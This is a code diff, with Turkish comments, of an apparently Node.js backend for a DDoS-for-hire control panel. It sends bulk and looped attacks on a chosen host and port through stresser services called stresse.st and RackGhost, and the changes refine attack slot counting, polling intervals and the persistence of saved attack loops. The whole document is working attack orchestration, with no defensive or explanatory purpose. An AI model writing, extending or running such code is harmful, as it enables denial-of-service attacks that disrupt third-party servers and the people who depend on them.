@@ -387,12 +387,14 @@ function loadState() {
       Object.entries(parsed).forEach(([loopId, loop]) => {
         // Eski formattaki loop'lari at: URL protokolu iceren host, buyuk harfli method,
         // veya schemaVersion olmayan kayitlar. Bu loop'lar yeni kodla calismaz ve
-        // sonsuz hata uretirler.
+        // sonsuz hata uretirler. RackGhost loop'lari method'u BUYUK harf tasir
+        // (onlarin API'si oyle istiyor); buyuk-harf kontrolu onlara uygulanmaz.
         const host = loop.params?.host || '';
         const method = loop.params?.method || '';
+        const isRackghost = loop.params?.provider === 'rackghost';
         const isOldFormat =
           /^https?:\/\//i.test(host) ||
-          method !== method.toLowerCase() ||
+          (!isRackghost && method !== method.toLowerCase()) ||
           !loop.schemaVersion;
         if (isOldFormat) {
           console.log(`[persistence] Eski format loop atildi: ${loopId}`);
@@ -1809,10 +1811,11 @@ app.post('/api/stresse/attack/bulk', async (req, res) => {
       try {
         const result = await rackghost.startAttack({ host, port: parseInt(port), time: parseInt(time), concurrents: count, method });
         result.attackIds.forEach((attackId) => {
-          registerAttack(attackId, sessionId, { host, port: parseInt(port), method, time, layer, provider: 'rackghost', group: resolveGroupName(req.body.group) || undefined });
+          const slots = (result.raw || []).find((it) => String(it.id) === String(attackId));
+          registerAttack(attackId, sessionId, { host, port: parseInt(port), method, time, layer, provider: 'rackghost', group: resolveGroupName(req.body.group) || undefined }, null, parseInt(slots?.slots, 10) || 1);
         });
         addAttackHistory(sessionId, { host, port, method, time, layer, note }, { concurrents: count });
-        return res.json({ status: 'success', message: `${result.attackIds.length} saldırı başlatıldı (RackGhost)`, attackIds: result.attackIds });
+        return res.json({ status: 'success', message: `${result.slotsTotal || result.attackIds.length} saldırı başlatıldı (RackGhost)`, attackIds: result.attackIds });
       } catch (err) {
         return res.status(err.sessionExpired ? 503 : 502).json({ status: 'error', message: `RackGhost: ${err.message}` });
       }
@@ -2154,16 +2157,17 @@ async function runLoopRound(loopId) {
     let stillActive = new Set(previousRoundIds);
 
     if (isRackghost) {
-      // RackGhost: onceki tur ID'leri rackghost ongoing'den dusene kadar bekle
+      // RackGhost: onceki tur ID'leri rackghost ongoing'den dusene kadar bekle.
+      // Rate limit 1 istek/sn oldugu icin yoklama 2.5sn'de bir.
       while (stillActive.size > 0 && Date.now() - startedWaiting < maxWaitMs) {
         try {
           const ongoingList = await rackghost.getOngoing();
           const ongoingIds = new Set(ongoingList.map((a) => String(a.id || a.attack_id)));
           stillActive = new Set([...previousRoundIds].filter((id) => ongoingIds.has(String(id))));
-          if (stillActive.size > 0) await new Promise((r) => setTimeout(r, checkIntervalMs));
+          if (stillActive.size > 0) await new Promise((r) => setTimeout(r, 2500));
         } catch (err) {
           console.warn(`[loop ${loopId}] rackghost ongoing hatasi:`, err.message);
-          await new Promise((r) => setTimeout(r, checkIntervalMs));
+          await new Promise((r) => setTimeout(r, 2500));
         }
       }
     } else {
@@ -2223,6 +2227,9 @@ async function runLoopRound(loopId) {
       data = { status: 'success' };
       attackIds = rgResult.attackIds;
       elapsedSec = 0;
+      // RackGhost slots alanini ID->slots haritasina cevir (kayit concurrents icin)
+      var rgSlotsById = {};
+      (rgResult.raw || []).forEach((it) => { rgSlotsById[String(it.id)] = parseInt(it.slots, 10) || 1; });
     } else {
       ({ data, attackIds, elapsedSec } = await launchAttacksGet(loop.sessionId, loop.params, loop.params.concurrents, loopId));
     }
@@ -2230,11 +2237,15 @@ async function runLoopRound(loopId) {
       roundSuccesses = attackIds.length;
       loop.roundAttackIds = attackIds;
       attackIds.forEach((attackId) => {
-        registerAttack(attackId, loop.sessionId, loop.params, loopId, 1, elapsedSec || 0);
+        const slots = isRackghost && typeof rgSlotsById !== 'undefined' ? (rgSlotsById[String(attackId)] || 1) : 1;
+        registerAttack(attackId, loop.sessionId, loop.params, loopId, slots, elapsedSec || 0);
       });
-      console.log(`[loop ${loopId}] round ${round} basarili: ${attackIds.length} saldiri (istenen: ${loop.params.concurrents})`);
-      if (attackIds.length !== loop.params.concurrents) {
-        console.warn(`[loop ${loopId}] round ${round} UYARI: stresse.st ${loop.params.concurrents} yerine ${attackIds.length} attackId dondurdu`);
+      const successCount = isRackghost && typeof rgSlotsById !== 'undefined'
+        ? Object.values(rgSlotsById).reduce((a, b) => a + b, 0)
+        : attackIds.length;
+      console.log(`[loop ${loopId}] round ${round} basarili: ${successCount} saldiri (istenen: ${loop.params.concurrents})`);
+      if (successCount !== loop.params.concurrents) {
+        console.warn(`[loop ${loopId}] round ${round} UYARI: ${isRackghost ? 'rackghost' : 'stresse.st'} ${loop.params.concurrents} yerine ${successCount} attackId dondurdu`);
       }
     } else if (data?.status === 'success' || data?.message === 'Attack started') {
       // Dogrulanamayan basari: stresse.st success diyor ama /ongoing JSON'u bu
@@ -3536,6 +3547,7 @@ async function liveHubTick(hub, username) {
             target: `${a.host}:${a.port}`,
             method: a.method,
             timeLeft: String(tl),
+            count: parseInt(a.slots, 10) || 1,
             provider: 'rackghost'
           });
         });
